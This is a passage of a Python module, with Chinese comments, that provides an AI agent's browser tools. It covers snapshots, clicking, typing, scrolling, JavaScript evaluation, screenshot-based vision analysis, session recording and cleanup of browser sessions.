    result = _run_browser_command(effective_task_id, "snapshot", args)

    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})

        # 检查快照是否需要摘要
        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
            snapshot_text = _truncate_snapshot(snapshot_text)

        response = {
            "success": True,
            "snapshot": snapshot_text,
            "element_count": len(refs) if refs else 0
        }
        _copy_fallback_warning(response, result)

        # 当本 task 挂载了 CDP supervisor 时，合并 supervisor 状态
        # （待处理的对话框 + frame tree）。否则什么也不做。参见
        # website/docs/developer-guide/browser-supervisor.md。
        try:
            from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
            _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
            if _supervisor is not None:
                _sv_snap = _supervisor.snapshot()
                if _sv_snap.active:
                    response.update(_sv_snap.to_dict())
        except Exception as _sv_exc:
            logger.debug("supervisor snapshot merge failed: %s", _sv_exc)

        return json.dumps(response, ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get snapshot")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_click(ref: str, task_id: Optional[str] = None) -> str:
    """
    点击某个元素。

    参数：
        ref: 元素引用（例如 "@e5"）
        task_id: 用于会话隔离的任务标识符

    返回：
        包含点击结果的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_click
        return camofox_click(ref, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # 确保 ref 以 @ 开头
    if not ref.startswith("@"):
        ref = f"@{ref}"

    result = _run_browser_command(effective_task_id, "click", [ref])

    if result.get("success"):
        response = {
            "success": True,
            "clicked": ref
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to click {ref}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
    """
    在输入框中输入文本。

    参数：
        ref: 元素引用（例如 "@e3"）
        text: 要输入的文本
        task_id: 用于会话隔离的任务标识符

    返回：
        包含输入结果的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_type
        return camofox_type(ref, text, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # 确保 ref 以 @ 开头
    if not ref.startswith("@"):
        ref = f"@{ref}"

    # 使用 fill 命令（先清空再输入）
    result = _run_browser_command(effective_task_id, "fill", [ref, text])

    if result.get("success"):
        response = {
            "success": True,
            "typed": text,
            "element": ref
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to type into {ref}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
    """
    滚动页面。

    参数：
        direction: "up" 或 "down"
        task_id: 用于会话隔离的任务标识符

    返回：
        包含滚动结果的 JSON 字符串
    """
    # 校验方向
    if direction not in {"up", "down"}:
        return json.dumps({
            "success": False,
            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
        }, ensure_ascii=False)

    # 用单次带像素量的滚动，代替 5 次子进程调用。
    # agent-browser 支持：agent-browser scroll down 500
    # 约 500px 大致是半个视口的滚动量。
    _SCROLL_PIXELS = 500

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_scroll
        # Camofox REST API 不支持像素参数；用重复调用来实现
        _SCROLL_REPEATS = 5
        result = None
        for _ in range(_SCROLL_REPEATS):
            result = camofox_scroll(direction, task_id)
        return result

    effective_task_id = _last_session_key(task_id or "default")

    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
    if not result.get("success"):
        response = {
            "success": False,
            "error": result.get("error", f"Failed to scroll {direction}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    response = {
        "success": True,
        "scrolled": direction
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_back(task_id: Optional[str] = None) -> str:
    """
    在浏览器历史中后退一页。

    参数：
        task_id: 用于会话隔离的任务标识符

    返回：
        包含导航结果的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_back
        return camofox_back(task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "back", [])

    if result.get("success"):
        data = result.get("data", {})
        response = {
            "success": True,
            "url": data.get("url", "")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to go back")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_press(key: str, task_id: Optional[str] = None) -> str:
    """
    按下某个键盘按键。

    参数：
        key: 要按下的键（例如 "Enter"、"Tab"）
        task_id: 用于会话隔离的任务标识符

    返回：
        包含按键结果的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_press
        return camofox_press(key, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "press", [key])

    if result.get("success"):
        response = {
            "success": True,
            "pressed": key
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to press {key}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)





def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """获取浏览器控制台消息和 JavaScript 错误，或在页面中执行 JS。

    当提供 ``expression`` 时，在页面上下文中执行 JavaScript
    （类似 DevTools 控制台）并返回结果。否则返回控制台输出
    （log/warn/error/info）以及未捕获的异常。

    参数：
        clear: 为 True 时，在读取后清空消息/错误缓冲区
        expression: 要在页面上下文中执行的 JavaScript 表达式
        task_id: 用于会话隔离的任务标识符

    返回：
        包含控制台消息/错误，或执行结果的 JSON 字符串
    """
    # --- JS 执行模式 ---
    if expression is not None:
        return _browser_eval(expression, task_id)

    # --- 控制台输出模式（原有行为） ---
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_console
        return camofox_console(clear, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []

    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)

    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({
                "type": msg.get("type", "log"),
                "text": msg.get("text", ""),
                "source": "console",
            })

    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({
                "message": err.get("message", ""),
                "source": "exception",
            })

    response = {
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    }
    _copy_fallback_warning(response, console_result)
    if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
        _copy_fallback_warning(response, errors_result)
    return json.dumps(response, ensure_ascii=False)


def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
    """在页面上下文中执行 JavaScript 表达式并返回结果。"""
    if _is_camofox_mode():
        return _camofox_eval(expression, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # --- 快速路径：经由 supervisor 持久化的 CDP WebSocket ---------------
    # 当本 task_id 存在存活的 CDPSupervisor 时，``Runtime.evaluate`` 会在
    # 已连接的 WebSocket 上执行 —— 相比另起一个 ``agent-browser eval``
    # CLI 子进程，零启动开销。任何错误都会回落到子进程路径，因此在没有
    # supervisor 运行时（例如没有 CDP 后端的纯 agent-browser）行为不变。
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
        if supervisor is not None:
            sup_result = supervisor.evaluate_runtime(expression)
            if sup_result.get("ok"):
                raw_result = sup_result.get("result")
                # 与 agent-browser 路径保持一致：如果值是 JSON 字符串，就解析它，
                # 让模型拿到结构化数据。
                parsed = raw_result
                if isinstance(raw_result, str):
                    try:
                        parsed = json.loads(raw_result)
                    except (json.JSONDecodeError, ValueError):
                        pass  # 保留为字符串
                response = {
                    "success": True,
                    "result": parsed,
                    "result_type": type(parsed).__name__,
                    "method": "cdp_supervisor",
                }
                return json.dumps(response, ensure_ascii=False, default=str)
            # JS 异常是真实的失败 —— 直接抛出，而不是回落到子进程路径
            # （那样只会更慢地重跑一次、得到同一个异常）。
            err = sup_result.get("error") or "evaluate_runtime failed"
            if "supervisor" not in err.lower():
                # 真实的 JS 侧错误 —— 直接返回。
                return json.dumps({"success": False, "error": err}, ensure_ascii=False)
            # supervisor 侧失败（loop 宕机、无会话）—— 回落到子进程路径。
            logger.debug(
                "browser_eval: supervisor path unavailable (%s), falling back to subprocess",
                err,
            )
    except ImportError:
        pass
    except Exception as exc:  # pragma: no cover — 防御性处理
        logger.debug("browser_eval: supervisor path errored (%s), falling back", exc)

    # --- 兜底：agent-browser CLI 子进程（原路径） ----------------------
    result = _run_browser_command(effective_task_id, "eval", [expression])

    if not result.get("success"):
        err = result.get("error", "eval failed")
        # 检测后端能力缺口，给模型一个清晰的信号
        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
            response = {
                "success": False,
                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
            }
            return json.dumps(_copy_fallback_warning(response, result))
        # 存活的 DOM 节点 / NodeList / Window 无法被 CDP 做 JSON 序列化，
        # 会让 eval 以 "Object reference chain is too long" 失败。supervisor
        # 快速路径会用 returnByValue=false 重试，但 CLI 子进程做不到，
        # 因此把这个晦涩的协议错误转成可操作的指引，而不是原样抛出。
        if "reference chain is too long" in err.lower():
            response = {
                "success": False,
                "error": (
                    "Expression returned a live DOM node / NodeList / Window, "
                    "which can't be serialized. Extract a primitive value "
                    "(e.g. .innerText, .href, .src, .value) or use "
                    "JSON.stringify() / a snapshot tool instead."
                ),
            }
            return json.dumps(_copy_fallback_warning(response, result))
        response = {
            "success": False,
            "error": err,
        }
        return json.dumps(_copy_fallback_warning(response, result))

    data = result.get("data", {})
    raw_result = data.get("result")

    # eval 命令以字符串形式返回 JS 结果。如果该字符串是合法的 JSON，
    # 就解析它，让模型拿到结构化数据。
    parsed = raw_result
    if isinstance(raw_result, str):
        try:
            parsed = json.loads(raw_result)
        except (json.JSONDecodeError, ValueError):
            pass  # 保留为字符串

    response = {
        "success": True,
        "result": parsed,
        "result_type": type(parsed).__name__,
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)


def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
    """通过 Camofox 的 /tabs/{tab_id}/eval 端点执行 JS（如果可用）。"""
    from tools.browser_camofox import _ensure_tab, _post
    try:
        tab_info = _ensure_tab(task_id or "default")
        tab_id = tab_info.get("tab_id") or tab_info.get("id")
        resp = _post(f"/tabs/{tab_id}/evaluate", body={"expression": expression, "userId": tab_info["user_id"]})

        # Camofox 把结果放在一个 JSON 信封里返回
        raw_result = resp.get("result") if isinstance(resp, dict) else resp
        parsed = raw_result
        if isinstance(raw_result, str):
            try:
                parsed = json.loads(raw_result)
            except (json.JSONDecodeError, ValueError):
                pass

        return json.dumps({
            "success": True,
            "result": parsed,
            "result_type": type(parsed).__name__,
        }, ensure_ascii=False, default=str)
    except Exception as e:
        error_msg = str(e)
        # 优雅降级 —— 服务器可能不支持 eval
        if any(code in error_msg for code in ("404", "405", "501")):
            return json.dumps({
                "success": False,
                "error": "JavaScript evaluation is not supported by this Camofox server. "
                         "Use browser_snapshot or browser_vision to inspect page state.",
            })
        return tool_error(error_msg, success=False)


def _maybe_start_recording(task_id: str):
    """若 config 里启用了 browser.record_sessions，则开始录制。"""
    with _cleanup_lock:
        if task_id in _recording_sessions:
            return
    try:
        from hermes_cli.config import read_raw_config
        hermes_home = get_hermes_home()
        cfg = read_raw_config()
        record_enabled = cfg_get(cfg, "browser", "record_sessions", default=False)

        if not record_enabled:
            return

        recordings_dir = hermes_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"

        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            with _cleanup_lock:
                _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str):
    """若本会话存在活动录制，则停止录制。"""
    with _cleanup_lock:
        if task_id not in _recording_sessions:
            return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        with _cleanup_lock:
            _recording_sessions.discard(task_id)


def browser_get_images(task_id: Optional[str] = None) -> str:
    """
    获取当前页面上的所有图片。

    参数：
        task_id: 用于会话隔离的任务标识符

    返回：
        包含图片列表（src 与 alt）的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_get_images
        return camofox_get_images(task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # 用 eval 执行一段 JavaScript 来抽取图片
    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""

    result = _run_browser_command(effective_task_id, "eval", [js_code])

    if result.get("success"):
        data = result.get("data", {})
        raw_result = data.get("result", "[]")

        try:
            # 解析 JavaScript 返回的 JSON 字符串
            if isinstance(raw_result, str):
                images = json.loads(raw_result)
            else:
                images = raw_result

            response = {
                "success": True,
                "images": images,
                "count": len(images)
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        except json.JSONDecodeError:
            response = {
                "success": True,
                "images": [],
                "count": 0,
                "warning": "Could not parse image data"
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get images")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
    """
    对当前页面截图，用于视觉检查。

    捕获浏览器中实际显示的内容。当当前模型支持原生视觉能力时，截图会直接
    附到对话中，让模型在下一回合查看；否则 Hermes 会回落到辅助视觉模型，
    返回文本分析结果。适合那些基于文本的快照可能捕捉不到的视觉内容
    （CAPTCHA、验证挑战、图片、复杂布局等）。

    截图会被持久化保存，并返回其文件路径，以便通过响应中的
    MEDIA:<path> 分享给用户。

    参数：
        question: 你想在视觉上了解页面的什么内容
        annotate: 为 True 时，在交互元素上叠加带编号的 [N] 标签
        task_id: 用于会话隔离的任务标识符

    返回：
        包含视觉分析结果和 screenshot_path 的 JSON 字符串；或携带截图与
        元数据的多模态工具结果信封。
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_vision
        return camofox_vision(question, annotate, task_id)

    import base64
    import uuid as uuid_mod
    from hermes_constants import get_hermes_dir
    screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
    effective_task_id = _last_session_key(task_id or "default")

    # Lightpanda 没有图形渲染器 —— 通过回退辅助函数把截图预先路由到 Chrome，
    # 而不是让正常路径以 CDP 错误失败、或返回一张占位 PNG。下方的正常分析
    # 路径仍然负责 base64 编码、provider 路由、缩放重试、脱敏以及响应结构。
    engine = _get_browser_engine()
    _lp_prerouted = False
    _lp_fallback_warning = None
    if engine == "lightpanda" and _should_inject_engine(engine):
        logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
        screenshot_args = []
        if annotate:
            screenshot_args.append("--annotate")
        fb_result = _chrome_fallback_screenshot(
            effective_task_id, screenshot_args, _get_command_timeout(),
        )
        fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
        fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
        if fb_result.get("success"):
            _lp_prerouted = True
            _lp_fallback_warning = fb_result.get("fallback_warning")
            fb_path = fb_result.get("data", {}).get("path", "")
            if fb_path and os.path.exists(fb_path):
                from hermes_constants import get_hermes_dir
                screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
                screenshots_dir.mkdir(parents=True, exist_ok=True)
                import shutil as _shutil_vision
                persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
                _shutil_vision.copy2(fb_path, persistent_path)
                screenshot_path = persistent_path
        else:
            logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
            # 回落到正常的截图路径，让 _run_browser_command 仍能产出标准的
            # 回退元信息/错误。
            _lp_prerouted = False

    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # 清理 24 小时前的旧截图，防止磁盘占用无限增长
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)

        if _lp_prerouted and screenshot_path.exists():
            result = {
                "success": True,
                "data": {
                    "path": str(screenshot_path),
                    "fallback_warning": _lp_fallback_warning,
                    "browser_engine": "chrome",
                    "browser_engine_fallback": {
                        "from": "lightpanda",
                        "to": "chrome",
                        "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                    },
                },
                "fallback_warning": _lp_fallback_warning,
                "browser_engine": "chrome",
                "browser_engine_fallback": {
                    "from": "lightpanda",
                    "to": "chrome",
                    "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                },
            }
        else:
            # 用 agent-browser 截图
            screenshot_args = []
            if annotate:
                screenshot_args.append("--annotate")
            screenshot_args.append("--full")
            screenshot_args.append(str(screenshot_path))
            result = _run_browser_command(
                effective_task_id,
                "screenshot",
                screenshot_args,
                # 若 Lightpanda 预路由已经失败，则强制使用 Chrome，以免
                # _run_browser_command 再触发一次多余的 LP 回退。
                _engine_override="auto" if _lp_prerouted else None,
            )

        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            error_response = {
                "success": False,
                "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
            }
            return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        # 检查截图文件是否已创建
        if not screenshot_path.exists():
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            return json.dumps({
                "success": False,
                "error": (
                    f"Screenshot file was not created at {screenshot_path} ({mode} mode). "
                    f"This may indicate a socket path issue (macOS /var/folders/), "
                    f"a missing Chromium install ('agent-browser install'), "
                    f"or a stale daemon process."
                ),
            }, ensure_ascii=False)

        # 把截图按原始分辨率转换为 base64。
        _screenshot_bytes = screenshot_path.read_bytes()
        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
        data_url = f"data:image/png;base64,{_screenshot_b64}"

        # 快速路径：当当前主模型启用了原生图像路由时，直接附上截图，
        # 而不是通过辅助视觉 LLM 来描述。模型在下一回合直接查看像素
        # —— 无需辅助调用、无信息损失。与 vision_analyze 保持一致。
        from tools.vision_tools import (
            _build_native_vision_tool_result,
            _should_use_native_vision_fast_path,
        )

        if _should_use_native_vision_fast_path():
            native_result = _build_native_vision_tool_result(
                image_url=str(screenshot_path),
                question=question,
                image_data_url=data_url,
                image_size_bytes=len(_screenshot_bytes),
            )
            meta = native_result.setdefault("meta", {})
            meta["screenshot_path"] = str(screenshot_path)
            if _lp_fallback_warning:
                meta["fallback_warning"] = _lp_fallback_warning
            if annotate and result.get("data", {}).get("annotations"):
                meta["annotations"] = result["data"]["annotations"]
            native_result["text_summary"] = (
                f"{native_result.get('text_summary', '')} "
                f"Screenshot path: {screenshot_path}"
            ).strip()
            return native_result

        vision_prompt = (
            f"You are analyzing a screenshot of a web browser.\n\n"
            f"User's question: {question}\n\n"
            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
            f"If there are interactive elements, describe them. If there are verification challenges "
            f"or CAPTCHAs, describe what type they are and what action might be needed. "
            f"Focus on answering the user's specific question."
        )

        # 使用集中的 LLM 路由器
        vision_model = _get_vision_model()
        logger.debug("browser_vision: analysing screenshot (%d bytes)",
                     len(_screenshot_bytes))

        # 从 config 读取视觉超时/温度（auxiliary.vision.*）。
        # 本地视觉模型（llama.cpp、ollama）做截图分析可能远超 30 秒，
        # 因此默认超时必须宽松。
        vision_timeout = 120.0
        vision_temperature = 0.1
        try:
            from hermes_cli.config import load_config
            _cfg = load_config()
            _vision_cfg = cfg_get(_cfg, "auxiliary", "vision", default={})
            _vt = _vision_cfg.get("timeout")
            if _vt is not None:
                vision_timeout = float(_vt)
            _vtemp = _vision_cfg.get("temperature")
            if _vtemp is not None:
                vision_temperature = float(_vtemp)
        except Exception:
            pass

        call_kwargs = {
            "task": "vision",
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": vision_prompt},
                        {"type": "image_url", "image_url": {"url": data_url}},
                    ],
                }
            ],
            "max_tokens": 2000,
            "temperature": vision_temperature,
            "timeout": vision_timeout,
        }
        if vision_model:
            call_kwargs["model"] = vision_model
        # 先尝试原始尺寸的截图；若因尺寸问题被拒绝，则缩小后重试。
        try:
            response = call_llm(**call_kwargs)
        except Exception as _api_err:
            from tools.vision_tools import (
                _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
            )
            if (_is_image_size_error(_api_err)
                    and len(data_url) > _RESIZE_TARGET_BYTES):
                logger.info(
                    "Vision API rejected screenshot (%.1f MB); "
                    "auto-resizing to ~%.0f MB and retrying...",
                    len(data_url) / (1024 * 1024),
                    _RESIZE_TARGET_BYTES / (1024 * 1024),
                )
                data_url = _resize_image_for_vision(
                    screenshot_path, mime_type="image/png")
                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
                response = call_llm(**call_kwargs)
            else:
                raise

        analysis = (response.choices[0].message.content or "").strip()
        # 对视觉 LLM 可能从截图中读到的密钥做脱敏。
        from agent.redact import redact_sensitive_text
        analysis = redact_sensitive_text(analysis)
        response_data = {
            "success": True,
            "analysis": analysis or "Vision analysis returned no content.",
            "screenshot_path": str(screenshot_path),
        }
        _copy_fallback_warning(response_data, result)
        # 若截了带标注的图，则附上标注数据
        if annotate and result.get("data", {}).get("annotations"):
            response_data["annotations"] = result["data"]["annotations"]
        return json.dumps(response_data, ensure_ascii=False)

    except Exception as e:
        # 若截图已成功捕获则保留它 —— 失败发生在 LLM 视觉分析阶段，
        # 而不是捕获阶段。删除一张有效截图会丢失用户可能需要的证据。
        # _cleanup_old_screenshots 的 24 小时清理可防止磁盘占用无限增长。
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        _copy_fallback_warning(error_info, result if 'result' in locals() else {})
        return json.dumps(error_info, ensure_ascii=False)


def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
    """删除超过 max_age_hours 的浏览器截图，以防磁盘膨胀。

    每个目录每小时最多执行一次，以避免在截图密集的工作流中反复扫描。
    """
    key = str(screenshots_dir)
    now = time.time()
    if now - _last_screenshot_cleanup_by_dir.get(key, 0.0) < 3600:
        return
    _last_screenshot_cleanup_by_dir[key] = now

    try:
        cutoff = time.time() - (max_age_hours * 3600)
        for f in screenshots_dir.glob("browser_screenshot_*.png"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old screenshot %s: %s", f, e)
    except Exception as e:
        logger.debug("Screenshot cleanup error (non-critical): %s", e)


def _cleanup_old_recordings(max_age_hours=72):
    """删除超过 max_age_hours 的浏览器录屏，以防磁盘膨胀。"""
    try:
        hermes_home = get_hermes_home()
        recordings_dir = hermes_home / "browser_recordings"
        if not recordings_dir.exists():
            return
        cutoff = time.time() - (max_age_hours * 3600)
        for f in recordings_dir.glob("session_*.webm"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old recording %s: %s", f, e)
    except Exception as e:
        logger.debug("Recording cleanup error (non-critical): %s", e)


# ============================================================================
# 清理与管理函数
# ============================================================================

def cleanup_browser(task_id: Optional[str] = None) -> None:
    """
    清理某个 task 的浏览器会话。

    在任务完成或达到不活跃超时时自动调用。
    同时关闭 agent-browser/Browserbase 会话和 Camofox 会话。

    当 ``task_id`` 是裸任务标识符（不带 ``::local`` 后缀）时，会同时回收
    云端/主会话，以及该 task 在 LAN/localhost URL 上可能拉起的混合路由
    本地 sidecar。当 ``task_id`` 已带 ``::local`` 后缀时（即从清理循环中
    针对某个具体会话 key 调用），只回收该会话。

    参数：
        task_id: 任务标识符（或显式的会话 key）
    """
    if task_id is None:
        task_id = "default"

    # 展开为需要回收的完整会话 key 集合。对于裸 task_id，这包括
    # 云端/主 key，以及可能存在的本地 sidecar。
    if _is_local_sidecar_key(task_id):
        session_keys = [task_id]
        bare_task_id = task_id[: -len(_LOCAL_SUFFIX)]
    else:
        session_keys = [task_id]
        sidecar_key = f"{task_id}{_LOCAL_SUFFIX}"
        with _cleanup_lock:
            if sidecar_key in _active_sessions:
                session_keys.append(sidecar_key)
        bare_task_id = task_id

    for session_key in session_keys:
        _cleanup_single_browser_session(session_key)

    # 只有在清理裸 task 时才清除 last-active 指针
    # （即不是任务中途只回收某个 sidecar 的情况）。
    if not _is_local_sidecar_key(task_id):
        _last_active_session_key.pop(bare_task_id, None)


def _cleanup_single_browser_session(task_id: str) -> None:
    """内部使用：按精确的会话 key 回收单个浏览器会话。"""
    # 必须先停止本 task 的 CDP supervisor，以便在后端拆除底层 CDP 端点之前
    # 关闭我们的 WebSocket。
    _stop_cdp_supervisor(task_id)

    # 若处于 Camofox 模式，也清理 Camofox 会话。
    # 当启用了托管持久化时跳过完整关闭 —— 浏览器配置文件（及其会话 cookie）
    # 必须能跨 agent 任务保留。不活跃回收器仍会释放闲置资源。
    if _is_camofox_mode():
        try:
            from tools.browser_camofox import camofox_close, camofox_soft_cleanup
            if not camofox_soft_cleanup(task_id):
                camofox_close(task_id)
        except Exception as e:
            logger.debug("Camofox cleanup for task %s: %s", task_id, e)

    logger.debug("cleanup_browser called for task_id: %s", task_id)
    logger.debug("Active sessions: %s", list(_active_sessions.keys()))

    # 检查会话是否存在（在锁内），但暂不删除 ——
    # _run_browser_command 构造 close 命令时还需要它。
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)

    if session_info:
        bb_session_id = session_info.get("bb_session_id", "unknown")
        logger.debug("Found session for task %s: bb_session_id=%s", task_id, bb_session_id)

        # 关闭前先停止自动录制（保存文件）
        _maybe_stop_recording(task_id)

        # 先尝试通过 agent-browser 关闭（需要会话仍在 _active_sessions 中）
        try:
            _run_browser_command(task_id, "close", [], timeout=10)
            logger.debug("agent-browser close command completed for task %s", task_id)
        except Exception as e:
            logger.warning("agent-browser close failed for task %s: %s", task_id, e)

        # 现在在锁内从跟踪中移除
        with _cleanup_lock:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)

        # 云端模式：通过 provider API 关闭云端浏览器会话。
        # 本地 sidecar 的 bb_session_id 为 None，因此这里对它们是 no-op。
        if bb_session_id:
            provider = _get_cloud_provider()
            if provider is not None:
                try:
                    provider.close_session(bb_session_id)
                except Exception as e:
                    logger.warning("Could not close cloud browser session: %s", e)

        # 杀掉守护进程并清理 socket 目录
        session_name = session_info.get("session_name", "")
        if session_name:
            socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
            if os.path.exists(socket_dir):
                # agent-browser 会在 socket 目录里写入 {session}.pid
                pid_file = os.path.join(socket_dir, f"{session_name}.pid")
                if os.path.isfile(pid_file):
                    try:
                        from tools.process_registry import ProcessRegistry
                        daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                        ProcessRegistry._terminate_host_pid(daemon_pid)
                        logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
                    except (ProcessLookupError, ValueError, PermissionError, OSError):
                        logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
                shutil.rmtree(socket_dir, ignore_errors=True)

        logger.debug("Removed task %s from active sessions", task_id)
    else:
        logger.debug("No active session found for task_id: %s", task_id)


def cleanup_all_browsers() -> None:
    """
    清理所有活动浏览器会话。

    适用于关停时的清理。
    """
    with _cleanup_lock:
        task_ids = list(_active_sessions.keys())
    for task_id in task_ids:
        cleanup_browser(task_id)

    # 拆除所有 task 的 CDP supervisor，让后台线程退出。
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        SUPERVISOR_REGISTRY.stop_all()
    except Exception:
        pass

    # 重置已缓存的查找结果，以便下次使用时重新求值。
    global _cached_agent_browser, _agent_browser_resolved
    global _cached_command_timeout, _command_timeout_resolved
    global _cached_chromium_installed
